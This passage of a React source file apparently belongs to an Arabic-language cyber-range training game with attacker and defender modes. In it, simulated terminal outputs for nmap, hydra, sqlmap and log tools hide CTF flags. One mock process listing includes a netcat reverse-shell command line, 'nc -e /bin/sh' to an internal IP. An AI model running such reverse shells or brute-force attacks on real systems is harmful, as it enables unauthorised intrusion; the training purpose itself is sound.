            'dig': `; <<>> DiG 9.18.1 <<>> MX future-tech.com\n;; ANSWER SECTION:\nfuture-tech.com. 3600 IN MX 10 mail.future-tech.com.\nfuture-tech.com. 3600 IN MX 20 mail2.future-tech.com.\n;; ${hiddenFlag}\n;; Query time: 23 msec`,
            'nmap -sS': `Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.0023s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n3306/tcp open  mysql\n8080/tcp open  http-proxy\n# ${hiddenFlag}`,
            'nmap -sV': `Starting Nmap 7.92 ( https://nmap.org )\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 7.6p1\n80/tcp   open  http     Apache/2.4.41\n443/tcp  open  ssl/http Apache/2.4.41\n3306/tcp open  mysql    MySQL 5.7.38\n# Hidden: ${hiddenFlag}\nService detection performed.`,
            'hydra': `Hydra v9.3 starting at 2024-01-20 14:30:00\n[DATA] attacking ssh://192.168.1.1:22/\n[22][ssh] host: 192.168.1.1   login: admin   password: Password123!\n[STATUS] ${hiddenFlag}\n1 valid password found`,
            'sqlmap': `[INFO] testing connection to the target URL\navailable databases [5]:\n[*] information_schema\n[*] mysql\n[*] future_db\n[*] performance_schema\n[*] sys\n--- ${hiddenFlag} ---`,
            'sudo': `User admin may run the following commands:\n  (ALL) NOPASSWD: /usr/bin/cat\n  (ALL) NOPASSWD: /usr/bin/vim\n# ${hiddenFlag}`,
            'cat': `[ALERT] CRITICAL SYSTEM FLAG CAPTURED\nFLAG{BLACK_PANTHER_OPERATION_COMPLETE}\nContents: TOP SECRET - PROJECT NEXUS\n${hiddenFlag}`,
            'grep "query"': `[2024-01-20 03:05:12] query: future-tech.com type=A\n[2024-01-20 03:05:13] query: mail.future-tech.com type=MX\n[2024-01-20 03:05:14] query: ns1.future-tech.com type=NS\n--- ${hiddenFlag} ---`,
            'tcpdump': `listening on eth0, capture size 262144 bytes\n03:10:22.345 IP 192.168.1.100 > 192.168.1.1: tcp SYN\n03:10:22.346 IP 192.168.1.100 > 192.168.1.1: tcp SYN\n03:10:22.347 [ALERT] Port scan detected\n# ${hiddenFlag}\n03:10:22.348 IP 192.168.1.100 > 192.168.1.1: tcp SYN`,
            'tail': `[**] [1:2001219:19] ET SCAN Nmap Scripting Engine User-Agent Detected\n[**] [1:2009582:5] ET SCAN NMAP -sS window 1024\nSrc: 192.168.1.100 -> Dst: 192.168.1.1\n-- ${hiddenFlag} --\nPriority: 2`,
            'grep "Failed': `Jan 20 03:15:01 server sshd: Failed password for admin from 192.168.1.100 port 54321 ssh2\nJan 20 03:15:02 server sshd: Failed password for admin from 192.168.1.100 port 54322 ssh2\n[Total: 847 failed attempts] ${hiddenFlag}`,
            'iptables': `Chain INPUT (policy ACCEPT)\nRule added: DROP all -- 192.168.1.100 anywhere\n${hiddenFlag}\niptables: Saving firewall rules to /etc/sysconfig/iptables`,
            'ps aux': `USER  PID  %CPU %MEM  COMMAND\nroot  1    0.0  0.1   /sbin/init\nroot  847  98.1 2.3   ./suspicious_miner\nroot  901  45.2 1.1   nc -e /bin/sh 192.168.1.100 4444\n# ${hiddenFlag}\nnobody 1024 0.0 0.0  /usr/sbin/apache2`,
            'chmod': `File permissions updated successfully\n-rw------- 1 root root 1024 Jan 20 14:30 secrets.txt\nAccess restricted. ${hiddenFlag}`
        };

        for (const [key, value] of Object.entries(outputs)) {
            if (task.command.includes(key)) return value;
        }

        return `Command executed successfully\nOutput: ${task.command}\n${hiddenFlag}\nTimestamp: ${new Date().toISOString()}`;
    };

    const generateErrorOutput = (command) => {
        const errors = [
            `Command '${command}' not found. Did you mean: ${task?.command}?`,
            `Error: Permission denied. Try checking your privileges.`,
            `Connection refused. Target may be behind a firewall.`,
            `Invalid syntax. Check the command format and try again.`
        ];
        return errors[Math.floor(Math.random() * errors.length)];
    };

    const handleKeyDown = (e) => {
        if (e.key === 'Enter') {
            handleCommand(terminalInput);
        }
    };

    useEffect(() => {
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
    }, [terminalHistory]);

    if (!mode) {
        return (
            <div className="min-h-screen bg-[#050214] text-white font-cairo flex items-center justify-center" dir="rtl">
                <MatrixBackground opacity={0.3} />

                <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="relative z-10 max-w-5xl w-full mx-6"
                >
                    <div className="text-center mb-8">
                        <h1 className="text-5xl font-bold mb-4 bg-gradient-to-r from-[#ff006e] via-[#7112AF] to-[#ff006e] bg-clip-text text-transparent">
                            {STORY.title}
                        </h1>
                        <p className="text-xl text-gray-400 mb-4">{STORY.description}</p>
                    </div>

                    {/* Full Story */}
                    <div className="bg-[#110C24] border border-[#7112AF]/30 rounded-2xl p-6 mb-8">
                        <h3 className="text-lg font-bold text-[#7112AF] mb-3 flex items-center gap-2"><BookOpen size={20} /> القصة الكاملة</h3>
                        <p className="text-gray-300 leading-relaxed text-sm">{STORY.fullStory}</p>
                        <div className="mt-4 grid grid-cols-4 gap-3">
                            {Object.values(STORY.characters).map((char, i) => (
                                <div key={i} className="bg-white/5 rounded-xl p-3 text-center border border-white/10">
                                    <div className="text-3xl mb-1">{char.avatar}</div>
                                    <div className="text-sm font-bold text-white">{char.name}</div>
                                    <div className="text-xs text-gray-400">{char.role}</div>
                                </div>
                            ))}
                        </div>
                    </div>

                    <div className="grid md:grid-cols-2 gap-8">
                        <motion.button
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            onClick={() => { setMode('attacker'); setShowPhaseIntro(true); }}
                            className="p-8 bg-gradient-to-br from-red-500/20 to-orange-500/10 border border-red-500/30 rounded-2xl hover:border-red-500/50 transition-all group text-right"
                        >
                            <div className="w-20 h-20 bg-red-500/20 rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:bg-red-500/30 transition-colors">
                                <Sword size={40} className="text-red-400" />
                            </div>
                            <h2 className="text-2xl font-bold text-white mb-3 text-center">🦊 وضع المهاجم (Red Team)</h2>
                            <p className="text-gray-400 mb-3 text-sm">ستعمل مع "الظل" — قائد فريق Red Team — لاختبار دفاعات شركة "تقنية المستقبل". ستتعلم أدوات جمع المعلومات، المسح، الاستغلال، ورفع الصلاحيات.</p>
                            <ul className="text-xs text-gray-500 space-y-1 mb-4">
                                <li>• 8 مهام عبر 5 مراحل</li>
                                <li>• أدوات: whois, dig, nmap, hydra, sqlmap</li>
                                <li>• الهدف: الوصول لملف الأسرار</li>
                            </ul>
                            <div className="flex items-center justify-center gap-2 text-red-400 font-bold">
                                <span>ابدأ الهجوم</span>
                                <ChevronRight size={20} />
                            </div>
                        </motion.button>

                        <motion.button
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            onClick={() => { setMode('defender'); setShowPhaseIntro(true); }}
                            className="p-8 bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 rounded-2xl hover:border-blue-500/50 transition-all group text-right"
                        >
                            <div className="w-20 h-20 bg-blue-500/20 rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:bg-blue-500/30 transition-colors">
                                <Shield size={40} className="text-blue-400" />
                            </div>
                            <h2 className="text-2xl font-bold text-white mb-3 text-center">🛡️ وضع المدافع (SOC Team)</h2>
                            <p className="text-gray-400 mb-3 text-sm">ستعمل مع "م. خالد" — مدير مركز عمليات الأمن — لاكتشاف وإيقاف الهجوم. ستتعلم تحليل السجلات، مراقبة الشبكة، وحماية الأنظمة.</p>
                            <ul className="text-xs text-gray-500 space-y-1 mb-4">
                                <li>• 7 مهام عبر 5 مراحل</li>
                                <li>• أدوات: grep, tcpdump, snort, iptables, chmod</li>
                                <li>• الهدف: حماية ملف الأسرار</li>
                            </ul>
                            <div className="flex items-center justify-center gap-2 text-blue-400 font-bold">
                                <span>ابدأ الدفاع</span>
                                <ChevronRight size={20} />
                            </div>
                        </motion.button>
                    </div>

                    {/* Story Phases Preview */}
                    <div className="mt-10 grid grid-cols-5 gap-4">
                        {STORY.phases.map((p, index) => (
                            <div key={p.id} className="text-center">
                                <div className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-2 ${index === 0 ? 'bg-[#ff006e] text-white' : 'bg-white/10 text-gray-400'
                                    }`}>
                                    <span className="font-bold">{index + 1}</span>
                                </div>
                                <div className="text-xs text-gray-400">{p.title}</div>
                            </div>
                        ))}
                    </div>
                </motion.div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#050214] text-white font-cairo" dir="rtl">
            <MatrixBackground opacity={0.2} />




            {/* Learning Modal */}
            {showLearningModal && learningData && (
                <div className="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-6" dir="rtl">
                    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-[#110C24] border-2 border-[#7112AF]/50 rounded-3xl p-8 max-w-2xl w-full shadow-[0_0_60px_rgba(113,18,175,0.3)]">
                        <div className="flex items-center gap-3 mb-6">
                            <div className="p-3 bg-green-500/20 rounded-xl"><CheckCircle size={28} className="text-green-400" /></div>
                            <div>
                                <h3 className="text-2xl font-bold text-white">✅ تم إنجاز المهمة: {learningData.task.title}</h3>
                                <p className="text-sm text-gray-400 mt-1">+{learningData.task.xp} XP</p>
                            </div>
                        </div>
                        <div className="space-y-4">
                            <div className="bg-[#1E1538] p-5 rounded-xl border border-purple-500/20">
                                <h4 className="font-bold text-purple-300 mb-2 flex items-center gap-2"><Terminal size={18} /> ماذا استخدمنا؟</h4>
                                <p className="text-gray-200 leading-relaxed">{learningData.learning.what}</p>
                            </div>
                            <div className="bg-[#1E1538] p-5 rounded-xl border border-blue-500/20">
                                <h4 className="font-bold text-blue-300 mb-2 flex items-center gap-2"><Lightbulb size={18} /> لماذا استخدمناه؟</h4>
                                <p className="text-gray-200 leading-relaxed">{learningData.learning.why}</p>
                            </div>
                        </div>
                        <div className="mt-6 flex justify-end">
                            <button onClick={handleCloseLearning} className="px-8 py-3 bg-gradient-to-r from-[#7112AF] to-[#ff006e] text-white rounded-xl font-bold hover:shadow-[0_0_20px_rgba(113,18,175,0.5)] transition-all flex items-center gap-2">
                                <span>المهمة التالية</span>
                                <ChevronRight size={20} className="rotate-180" />
                            </button>
                        </div>
                    </motion.div>
                </div>
            )}

            {/* Phase Intro Modal */}
            {showPhaseIntro && (
                <div className="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-6" dir="rtl">
                    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-[#110C24] border-2 border-[#7112AF]/50 rounded-3xl p-8 max-w-2xl w-full shadow-[0_0_60px_rgba(113,18,175,0.3)]">
                        <div className="text-center mb-6">
                            <div className={`inline-flex items-center gap-2 px-4 py-2 rounded-full text-sm font-bold mb-4 ${mode === 'attacker' ? 'bg-red-500/20 text-red-400' : 'bg-blue-500/20 text-blue-400'}`}>
                                المرحلة {currentPhase + 1} من {STORY.phases.length}
                            </div>
                            <h3 className="text-3xl font-bold text-white mb-2">{phase.title}</h3>
                            <p className="text-gray-400">{phase.description}</p>
                        </div>
                        <div className={`p-5 rounded-xl border mb-6 ${mode === 'attacker' ? 'bg-red-900/10 border-red-500/20' : 'bg-blue-900/10 border-blue-500/20'}`}>
                            <p className="text-lg leading-relaxed text-gray-200">
                                {mode === 'attacker' ? phase.attackerStory : phase.defenderStory}
                            </p>
                        </div>
                        <div className="bg-white/5 p-4 rounded-xl border border-white/10 mb-6">
                            <h4 className="font-bold text-yellow-400 mb-2 flex items-center gap-2"><Target size={18} /> هدف المرحلة:</h4>
                            <p className="text-gray-300">{mode === 'attacker' ? phase.attackerObjective : phase.defenderObjective}</p>
                        </div>
                        <div className="flex justify-center">
                            <button onClick={() => setShowPhaseIntro(false)} className="px-10 py-3 bg-gradient-to-r from-[#7112AF] to-[#ff006e] text-white rounded-xl font-bold hover:shadow-[0_0_20px_rgba(113,18,175,0.5)] transition-all">
                                ابدأ المرحلة
                            </button>
                        </div>
                    </motion.div>
                </div>
            )}

            {/* Completion Screen */}
            {showCompletion && (
                <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-6" dir="rtl">
                    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="text-center max-w-lg">
                        <Trophy size={80} className="text-yellow-400 mx-auto mb-6 drop-shadow-[0_0_30px_rgba(250,204,21,0.5)]" />
                        <h2 className="text-4xl font-bold text-white mb-4">🎉 اكتملت العملية!</h2>
                        <p className="text-xl text-gray-300 mb-8">لقد أكملت جميع مراحل عملية الفهد الأسود بنجاح!</p>
                        <div className="bg-[#110C24] p-8 rounded-3xl border border-[#7112AF]/30 mb-8">
                            <div className="text-5xl font-black text-yellow-400 mb-2">{totalXP} XP</div>
                            <div className="text-sm text-gray-400 uppercase tracking-widest">نقاط الخبرة المكتسبة</div>
                            <div className="mt-4 grid grid-cols-3 gap-4 text-center">
                                <div><div className="text-2xl font-bold text-white">{completedTasks.length}</div><div className="text-xs text-gray-500">مهمة مكتملة</div></div>
                                <div><div className="text-2xl font-bold text-white">{discoveredFlags.length}</div><div className="text-xs text-gray-500">أعلام</div></div>
                                <div><div className="text-2xl font-bold text-white">{formatTime(timeElapsed)}</div><div className="text-xs text-gray-500">الوقت</div></div>
                            </div>
                        </div>
                        <button onClick={() => { setShowCompletion(false); setMode(null); }} className="px-10 py-4 bg-gradient-to-r from-[#7112AF] to-[#ff006e] text-white rounded-xl font-bold text-lg hover:shadow-[0_0_20px_rgba(113,18,175,0.5)] transition-all">
                            العودة للقائمة الرئيسية
                        </button>
                    </motion.div>
                </div>
            )}

            {/* Header */}
            <div className="relative z-10 border-b border-white/10 bg-[#0a0a0f]/90 backdrop-blur-md">
                <div className="max-w-7xl mx-auto px-6 py-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button
                                onClick={() => setMode(null)}
                                className="p-2 bg-white/10 rounded-lg hover:bg-white/20 transition-colors"
                            >
                                <ChevronRight size={20} className="rotate-180" />
                            </button>
                            <div className={`p-3 rounded-lg ${mode === 'attacker' ? 'bg-red-500/20' : 'bg-blue-500/20'}`}>
                                {mode === 'attacker' ? (
                                    <Sword size={24} className="text-red-400" />
                                ) : (
                                    <Shield size={24} className="text-blue-400" />
                                )}
                            </div>
                            <div>
                                <h1 className="text-xl font-bold text-white">{STORY.title}</h1>
                                <p className="text-sm text-gray-400">
                                    {mode === 'attacker' ? 'وضع المهاجم' : 'وضع المدافع'} - {phase.title}
                                </p>
                            </div>
                        </div>

                        <div className="flex items-center gap-6">
                            {/* Timer */}
                            <div className="flex items-center gap-2 px-4 py-2 bg-white/5 rounded-lg">
                                <Clock size={18} className="text-gray-400" />
                                <span className="font-mono text-lg">{formatTime(timeElapsed)}</span>
                            </div>

                            {/* XP */}
                            <div className="flex items-center gap-2 px-4 py-2 bg-yellow-500/20 rounded-lg border border-yellow-500/30">
                                <Trophy size={18} className="text-yellow-400" />
                                <span className="text-yellow-400 font-bold">{totalXP} XP</span>
                            </div>

                            {/* Progress */}
                            <div className="w-48">
                                <div className="flex justify-between text-sm text-gray-400 mb-1">
                                    <span>التقدم</span>
                                    <span>{Math.round((completedTasks.length / tasks.length) * 100)}%</span>
                                </div>
                                <div className="w-full bg-white/10 rounded-full h-2">
                                    <motion.div
                                        className={`h-2 rounded-full ${mode === 'attacker' ? 'bg-red-500' : 'bg-blue-500'}`}
                                        initial={{ width: 0 }}
                                        animate={{ width: `${(completedTasks.length / tasks.length) * 100}%` }}
                                    />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {/* Phase Navigation */}
            <div className="relative z-10 bg-white/5 border-b border-white/10">
                <div className="max-w-7xl mx-auto px-6 py-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            {STORY.phases.map((p, index) => (
                                <button
                                    key={p.id}
                                    onClick={() => {
                                        setCurrentPhase(index);
                                        setCurrentTask(0);
                                    }}
                                    className={`flex items-center gap-2 px-4 py-2 rounded-lg font-bold transition-all ${currentPhase === index
                                        ? mode === 'attacker'
                                            ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                                            : 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                                        : 'text-gray-400 hover:bg-white/5'
                                        }`}
                                >
                                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${currentPhase === index
                                        ? mode === 'attacker' ? 'bg-red-500 text-white' : 'bg-blue-500 text-white'
                                        : 'bg-white/10'
                                        }`}>
                                        {index + 1}
                                    </div>
                                    <span className="hidden md:inline">{p.title}</span>
                                </button>
                            ))}
                        </div>

                        <div className="flex items-center gap-2">
                            <button
                                onClick={() => setShowNotes(!showNotes)}
                                className={`p-2 rounded-lg transition-colors ${showNotes ? 'bg-[#7112AF]/20 text-[#7112AF]' : 'bg-white/5 text-gray-400 hover:bg-white/10'}`}
                            >
                                <BookOpen size={20} />
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* Main Content */}
            <div className="relative z-10 p-6">
                <div className="max-w-7xl mx-auto">
                    <div className="grid grid-cols-12 gap-6">

                        {/* Left Panel - Tasks */}
                        <div className="col-span-3">
                            <div className="bg-white/5 border border-white/10 rounded-xl overflow-hidden">
                                <div className="p-4 border-b border-white/10">
                                    <h3 className="font-bold text-white flex items-center gap-2">
                                        <Target size={18} className={mode === 'attacker' ? 'text-red-400' : 'text-blue-400'} />
                                        المهام
                                    </h3>
                                    <p className="text-sm text-gray-400 mt-1">
                                        {mode === 'attacker' ? phase.attackerObjective : phase.defenderObjective}
                                    </p>
                                </div>
                                <div className="divide-y divide-white/5">
                                    {currentTasks.map((t, index) => (
                                        <button
                                            key={t.id}
                                            onClick={() => setCurrentTask(index)}
                                            className={`w-full p-4 text-right hover:bg-white/5 transition-colors ${currentTask === index ? 'bg-white/10 border-r-2 ' + (mode === 'attacker' ? 'border-r-red-500' : 'border-r-blue-500') : ''
                                                }`}
                                        >
                                            <div className="flex items-start gap-3">
                                                <div className={`w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 ${completedTasks.includes(t.id)
                                                    ? 'bg-green-500/20 text-green-400'
                                                    : currentTask === index
                                                        ? mode === 'attacker' ? 'bg-red-500/20 text-red-400' : 'bg-blue-500/20 text-blue-400'
                                                        : 'bg-white/10 text-gray-400'
                                                    }`}>
                                                    {completedTasks.includes(t.id) ? (
                                                        <CheckCircle size={14} />
                                                    ) : (
                                                        <span className="text-xs">{index + 1}</span>
                                                    )}
                                                </div>
                                                <div className="flex-1">
                                                    <div className="text-sm font-medium text-white">{t.title}</div>
                                                    <div className="text-xs text-gray-500 mt-1">+{t.xp} XP</div>
                                                </div>
                                            </div>
                                        </button>
                                    ))}
                                </div>
                            </div>

                            {/* Discovered Flags & Flag Challenge */}
                            <div className="mt-6 bg-gradient-to-br from-yellow-500/10 to-orange-500/10 border border-yellow-500/30 rounded-xl p-4">
                                <h3 className="font-bold text-white mb-3 flex items-center gap-2">
                                    <Flag size={18} className="text-yellow-400" />
                                    الأعلام المكتشفة
                                </h3>

                                {/* Solved flags list */}
                                {discoveredFlags.length > 0 && (
                                    <div className="space-y-1 mb-3">
                                        {discoveredFlags.map((flag, index) => (
                                            <div key={index} className="flex items-center gap-2 text-xs">
                                                <Trophy size={12} className="text-yellow-400 flex-shrink-0" />
                                                <code className="text-yellow-400 font-mono truncate">{flag}</code>
                                            </div>
                                        ))}
                                    </div>
                                )}
                                {discoveredFlags.length === 0 && (
                                    <p className="text-gray-400 text-sm">أكمل المهمة لكشف الأعلام</p>
                                )}

                                {/* Inline Flag Challenge */}
                                {task && task.flags && completedTasks.includes(task.id) && (() => {
                                    const taskFlags = solvedTaskFlags[task.id] || {};
                                    return (
                                        <div className="space-y-3 mt-4 pt-3 border-t border-yellow-500/20">
                                            <div className="text-xs text-yellow-400 font-bold mb-2">🏴 تحدي: {task.title}</div>

                                            {/* Easy Flag */}
                                            <div className={`p-3 rounded-lg border flex flex-col gap-2 ${taskFlags.easy ? 'bg-green-900/20 border-green-500/20' : 'bg-black/30 border-white/10'}`}>
                                                <div className="flex items-center gap-2">
                                                    <span className="px-1.5 py-0.5 bg-green-500/20 text-green-400 rounded text-[9px] font-bold">سؤال</span>
                                                    <span className="text-[10px] text-yellow-500">+{task.flags.easy.xp} XP</span>
                                                </div>
                                                <p className="text-gray-300 text-[11px] leading-relaxed">{task.flags.easy.question}</p>
                                                {taskFlags.easy ? (
                                                    <div className="flex items-center gap-1 text-green-400 text-[11px] font-bold mt-1"><CheckCircle size={12} /> صحيح!</div>
                                                ) : (
                                                    <div className="flex gap-1 mt-1">
                                                        <input type="text" value={flagInput}
                                                            onChange={(e) => { setFlagInput(e.target.value); setFlagError(''); }}
                                                            onKeyDown={(e) => e.key === 'Enter' && handleEasyFlagSubmit(task)}
                                                            placeholder="الإجابة..." dir="ltr"
                                                            className="flex-1 bg-black/50 border border-white/15 rounded px-2 py-1 text-white text-[10px] focus:outline-none focus:border-yellow-500/50"
                                                        />
                                                        <button onClick={() => handleEasyFlagSubmit(task)} className="px-2 py-1 bg-green-500/20 text-green-400 border border-green-500/30 rounded text-[10px] hover:bg-green-500/30">تحقق</button>
                                                    </div>
                                                )}
                                            </div>

                                            {/* Puzzle Flag */}
                                            <div className={`p-3 rounded-lg border flex flex-col gap-2 ${taskFlags.puzzle ? 'bg-yellow-900/20 border-yellow-500/20' : 'bg-black/30 border-white/10'}`}>
                                                <div className="flex items-center gap-2">
                                                    <span className="px-1.5 py-0.5 bg-orange-500/20 text-orange-400 rounded text-[9px] font-bold">فلاق مسرب بالنتائج</span>
                                                    <span className="text-[10px] text-yellow-500">+{task.flags.puzzle.xp} XP</span>
                                                </div>
                                                <p className="text-gray-300 text-[11px] leading-relaxed">{task.flags.puzzle.question}</p>
                                                {taskFlags.puzzle ? (
                                                    <div className="flex items-center gap-1 text-yellow-400 text-[11px] font-bold mt-1"><Trophy size={12} /> أحسنت!</div>
                                                ) : (
                                                    <div className="flex gap-1 mt-1">
                                                        <input type="text" value={flagPuzzleInput}
                                                            onChange={(e) => { setFlagPuzzleInput(e.target.value); setFlagError(''); }}
                                                            onKeyDown={(e) => e.key === 'Enter' && handlePuzzleFlagSubmit(task)}
                                                            placeholder="FLAG{...}" dir="ltr"
                                                            className="flex-1 bg-black/50 border border-white/15 rounded px-2 py-1 text-white text-[10px] focus:outline-none focus:border-orange-500/50"
                                                        />
                                                        <button onClick={() => handlePuzzleFlagSubmit(task)} className="px-2 py-1 bg-orange-500/20 text-orange-400 border border-orange-500/30 rounded text-[10px] hover:bg-orange-500/30">تحقق</button>
                                                    </div>
                                                )}
                                            </div>

                                            {flagError && <div className="text-red-400 text-[10px] text-center font-bold mt-1">{flagError}</div>}

                                            {/* Continue to learning button */}
                                            {taskFlags.easy && (
                                                <button onClick={() => handleFlagContinue(task)}
                                                    className="w-full mt-2 py-1.5 bg-gradient-to-r from-[#7112AF] to-[#ff006e] text-white rounded text-[11px] font-bold hover:shadow-[0_0_10px_rgba(113,18,175,0.4)] transition-all flex items-center justify-center gap-1">
                                                    انتقل للشرح <ChevronRight size={12} className="rotate-180" />
                                                </button>
                                            )}
                                        </div>
                                    );
                                })()}
                            </div>
                        </div>

                        {/* Center - Task & Terminal */}
                        <div className="col-span-6">
                            {task && (
                                <>
                                    {/* Task Card */}
                                    <div className={`bg-gradient-to-br ${mode === 'attacker' ? 'from-red-500/10 to-orange-500/10 border-red-500/30' : 'from-blue-500/10 to-cyan-500/10 border-blue-500/30'} border rounded-xl p-6 mb-6`}>
                                        <div className="flex items-center justify-between mb-4">
                                            <div className="flex items-center gap-3">
                                                <div className={`p-2 rounded-lg ${mode === 'attacker' ? 'bg-red-500/20' : 'bg-blue-500/20'}`}>
                                                    {mode === 'attacker' ? (
                                                        <Sword size={24} className="text-red-400" />
                                                    ) : (
                                                        <Shield size={24} className="text-blue-400" />
                                                    )}
                                                </div>
                                                <div>
                                                    <h2 className="text-xl font-bold text-white">{task.title}</h2>
                                                    <p className="text-sm text-gray-400">{task.description}</p>
                                                </div>
                                            </div>
                                            <div className="px-3 py-1 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold">
                                                +{task.xp} XP
                                            </div>
                                        </div>

                                        <div className="bg-black/50 rounded-lg p-4 font-mono">
                                            <div className="text-gray-400 text-sm mb-2">الأمر المتوقع:</div>
                                            <code className={`text-lg ${mode === 'attacker' ? 'text-red-400' : 'text-blue-400'}`}>
                                                {task.command}
                                            </code>
                                        </div>

                                        {/* Story Context - Character Dialogue */}
                                        {task.story_context && (
                                            <div className={`mt-4 p-4 rounded-lg border ${mode === 'attacker' ? 'bg-red-900/10 border-red-500/20' : 'bg-blue-900/10 border-blue-500/20'}`}>
                                                <div className="flex items-center gap-2 mb-2">
                                                    <MessageSquare size={16} className={mode === 'attacker' ? 'text-red-400' : 'text-blue-400'} />
                                                    <span className="text-xs font-bold text-gray-400 uppercase">سياق القصة</span>
                                                </div>
                                                <p className="text-sm text-gray-200 leading-relaxed">{task.story_context}</p>
                                            </div>
                                        )}

                                        <div className="mt-4 flex items-start gap-3 bg-yellow-500/10 rounded-lg p-3 border border-yellow-500/30">
                                            <Lightbulb size={18} className="text-yellow-400 mt-1" />
                                            <div>
                                                <div className="text-sm font-bold text-yellow-400">تلميح</div>
                                                <div className="text-sm text-gray-300">{task.hint}</div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Terminal */}
                                    <div className="bg-black rounded-xl border border-white/20 overflow-hidden shadow-2xl">
                                        <div className={`px-4 py-3 flex items-center justify-between ${mode === 'attacker' ? 'bg-red-500/20' : 'bg-blue-500/20'}`}>
                                            <div className="flex items-center gap-2">
                                                <div className="flex gap-2">
                                                    <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                                    <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                                    <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                                </div>
                                                <span className="text-gray-400 text-sm ml-4 font-mono">
                                                    {mode === 'attacker' ? 'kali@attacker:~/exploits' : 'admin@server:~/security'}
                                                </span>
                                            </div>
                                            <button
                                                onClick={() => setTerminalHistory([])}
                                                className="p-1 hover:bg-white/10 rounded"
                                            >
                                                <RotateCcw size={14} className="text-gray-400" />
                                            </button>
                                        </div>

                                        <div ref={terminalRef} className="p-4 h-64 overflow-y-auto font-mono text-sm" dir="ltr">
                                            {terminalHistory.length === 0 && (
                                                <div className="text-gray-500 mb-4">
                                                    {mode === 'attacker' ? (
                                                        <>Welcome to Kali Linux (GNU/Linux 5.18.0-kali5-amd64)<br />Ready to start offensive operations...</>
                                                    ) : (
                                                        <>Welcome to Ubuntu 20.04.4 LTS<br />Security monitoring active...</>
                                                    )}
                                                </div>
                                            )}

                                            {terminalHistory.map((entry, index) => (
                                                <div key={index} className="mb-2">
                                                    {entry.type === 'input' ? (
                                                        <div className={`${mode === 'attacker' ? 'text-red-400' : 'text-blue-400'}`}>
                                                            {entry.content}
                                                        </div>
                                                    ) : (
                                                        <div className="text-white whitespace-pre-wrap">{entry.content}</div>
                                                    )}
                                                </div>
                                            ))}

                                            <div className="flex items-center">
                                                <span className={`mr-2 ${mode === 'attacker' ? 'text-red-400' : 'text-blue-400'}`}>
                                                    {mode === 'attacker' ? '➜' : '$'}
                                                </span>
                                                <input
                                                    type="text"
                                                    value={terminalInput}
                                                    onChange={(e) => setTerminalInput(e.target.value)}
                                                    onKeyDown={handleKeyDown}
                                                    className="flex-1 bg-transparent border-none outline-none text-white font-mono"
                                                    placeholder="Enter command..."
                                                    autoFocus
                                                    spellCheck={false}
                                                    dir="ltr"
                                                />
                                            </div>
                                        </div>
                                    </div>

                                    {/* Quick Commands */}
                                    <div className="mt-4 flex flex-wrap gap-2">
                                        {['whois', 'nmap', 'hydra', 'sqlmap', 'grep', 'tcpdump', 'iptables', 'netstat'].map(cmd => (
                                            <button
                                                key={cmd}
                                                onClick={() => setTerminalInput(cmd + ' ')}
                                                className={`px-3 py-1 rounded text-xs font-mono transition-colors ${mode === 'attacker'
                                                    ? 'bg-red-500/20 text-red-400 hover:bg-red-500/30'
                                                    : 'bg-blue-500/20 text-blue-400 hover:bg-blue-500/30'
                                                    }`}
                                            >
                                                {cmd}
                                            </button>
                                        ))}
                                    </div>
                                </>
                            )}

                            {/* Environment Question */}
                            {showQuestion && (
                                <motion.div
                                    initial={{ opacity: 0, y: 20 }}
                                    animate={{ opacity: 1, y: 0 }}
                                    className="mt-6 bg-gradient-to-br from-purple-500/10 to-pink-500/10 border border-purple-500/30 rounded-xl p-6"
                                >
                                    <h3 className="text-lg font-bold text-white mb-4">اختبار المعرفة</h3>
                                    <p className="text-gray-300 mb-4">{ENVIRONMENT_QUESTIONS[currentQuestion].question}</p>
                                    <div className="space-y-2">
                                        {ENVIRONMENT_QUESTIONS[currentQuestion].options.map((option, index) => (
                                            <button
                                                key={index}
                                                onClick={() => {
                                                    if (index === ENVIRONMENT_QUESTIONS[currentQuestion].correct) {
                                                        setTotalXP(prev => prev + ENVIRONMENT_QUESTIONS[currentQuestion].xp);
                                                    }
                                                    if (currentQuestion < ENVIRONMENT_QUESTIONS.length - 1) {
                                                        setCurrentQuestion(prev => prev + 1);
                                                    } else {
                                                        setShowQuestion(false);
                                                    }
                                                }}
                                                className="w-full p-3 bg-white/5 rounded-lg hover:bg-white/10 transition-colors text-right"
                                            >
                                                {option}
                                            </button>
                                        ))}
                                    </div>
                                </motion.div>
                            )}
                        </div>

                        {/* Right Panel - Visual & Notes */}
